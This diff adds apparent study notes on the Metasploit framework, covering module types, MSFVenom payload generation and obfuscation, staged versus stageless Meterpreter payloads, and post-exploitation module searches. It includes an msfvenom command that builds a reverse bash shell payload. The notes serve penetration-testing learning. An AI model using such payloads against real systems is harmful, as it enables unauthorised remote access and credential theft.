@@ -1,0 +1,59 @@
+Metasploit is a powerful penetration testing framework used for security assessments and exploit development. 
+It provides a wide range of tools and features to assess and exploit vulnerabilities in systems.
+
+Metasploit Modules
+    Modules are the main components of the Metasploit framework. 
+    To use Metasploit, you interact with the modules that Metasploit gives you. 
+    Some of them are:
+        Auxiliary modules: These are used to perform reconnaissance on a server or test for specific vulnerabilities.
+        Exploit modules: These are used to exploit a server or a running service on a server, 
+            usually resulting in a reverse shell or Meterpreter session.
+        Payload modules: These provide the actual code that runs on the exploited server to perform some function, 
+            usually a reverse shell or Meterpreter session, but not always, 
+            e.g., running a PowerShell command. Payloads can be customized depending on the situation.
+        Post modules: These provide functionality after a reverse shell or Meterpreter session is established, 
+            e.g., stealing credentials or lateral movement.
+
+commands
+
+
+
+
+MSFVenom
+    MSFVenom is a malicious payload generation program.
+    It can generate several types of payloads, including compiled programs, raw payloads, and more.
+    Most of these payloads result in reverse shells, Meterpreter shells, 
+        or commands that must be executed on the target system.
+    
+        Here are some ways to customize the resulting payloads:
+            Encoding: Convert information, or an instruction, into a particular form.
+            Obfuscation: Mixing, jumbling, or obscuring some information so that it does not look malicious, even though it is malicious.
+            Encryption: Changing information to secret code from its original form.
+        
+    Meterpreter shells come in two flavors: staged and stageless. Both have pros and cons.
+        Staged payloads: These tend to be smaller, meaning that they can be included in more 
+            types of exploitation but must reach back to the Metasploit Command and Control (C2) server 
+            to get what they need to execute, presenting a risk of being caught.
+        Stageless payloads: Everything the payload needs is included in it. This makes the payload bigger but more reliable.
+    
+    The following command lists all the various payloads that can be generated using MSFVenom:
+        msfvenom --list payloads
+    
+    Once you find a payload appropriate for the system you are attempting to exploit, 
+        you can customize where it connects. 
+    For example, the following command generates a Bash payload that establishes 
+        a reverse shell to 127.0.0.1 on port 1234:
+    
+        msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=1234
+
+
+
+Meterpreter
+    Meterpreter can be thought of as a reverse shell with advanced penetration testing capabilities.
+    Several Metasploit modules result in either a reverse shell or a Meterpreter shell, 
+        so it is advisable to get comfortable with how to use them.
+    A Meterpreter shell provides shell access to the compromised system and the post modules that Metasploit provides.
+
+    Depending on whether you have a Meterpreter on a Windows or a Linux system:
+        search post/windows
+        search post/linux
